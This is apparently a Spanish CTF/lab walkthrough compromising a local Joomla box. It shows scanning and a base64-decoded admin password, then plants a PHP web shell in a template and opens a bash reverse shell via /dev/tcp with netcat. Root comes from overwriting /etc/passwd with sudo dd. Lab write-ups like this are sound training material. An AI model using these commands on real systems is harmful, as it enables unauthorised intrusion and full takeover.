Fecha: 07/09/2024

Empiezo usando nmap: 
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](Imágenes/Pasted%20image%2020240907220608.png)

Voy a hacer fuzzing:
```bash 
ffuf -c -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ  -e .php,.html,.txt,.js,.py -o fuzzing  
```

![](Imágenes/Pasted%20image%2020240907220826.png)

Veo que hay un archivo "robots.txt", así que accedo al mismo: 
![](Imágenes/Pasted%20image%2020240907221211.png)

Veo lo que podría ser una contraseña (`c2FubHVpczEyMzQ1`) Accedo al directorio "administrator" y veo lo que podrían ser un nombre de usuario (`TLuisillo_o`) y el nombre del servicio (`Joomla`):

![](Imágenes/Pasted%20image%2020240907221358.png)

Pruebo el usuario y contraseña en el formulario de login de esta sección, pero no funcionan. 
![](Imágenes/Pasted%20image%2020240907221329.png)

La contraseña podría estar en base64, así que pruebo a decodificarla:
![](Imágenes/Pasted%20image%2020240907221707.png)

Pruebo con esta contraseña y, tampoco me deja iniciar sesión. Al probar con admin, lo consigo. 

![](Imágenes/Pasted%20image%2020240907221843.png)

Busco en https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce y encuentro que puedo hacerme una reverse-shell. Añado `system($_GET['cmd']);` a error.php:

Podré ejecutar comandos con `curl -s 172.17.0.2/templates/cassiopeia/error.php?cmd=<comando>`
Me hago una reverse shell:
```bash
# Quiero ejecutar:
bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'
# Para ello, lo codificaré para url.
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F9001%200%3E%261%27


# En una terminal, ejecuto:
nc -lvnp 9001
# En otra:
curl -s http://172.17.0.2/templates/cassiopeia/error.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F9001%200%3E%261%27

```

Trato la tty: 
```bash
# Empezando desde la reverse shell:
script /dev/null -c bash

Control Z 

stty raw -echo; fg

reset xterm

export TERM=xterm
```

Como no encuentro la forma de escalar privilegios, busco ficheros .txt, encontrando uno con un nombre curioso:
![](Imágenes/Pasted%20image%2020240907223915.png)

![](Imágenes/Pasted%20image%2020240907223939.png)

Pruebo a iniciar sesión como "luisillo" usando esa contraseña. Funciona, así que miro como hacerme superusuario:
![](Imágenes/Pasted%20image%2020240907224023.png)

En https://gtfobins.github.io/gtfobins/dd/#sudo encuentro que puedo ejecutar:
```bash
echo "root::0:0:root:/root:/bin/bash" | sudo dd of=/etc/passwd
```


![](Imágenes/Pasted%20image%2020240907233013.png)
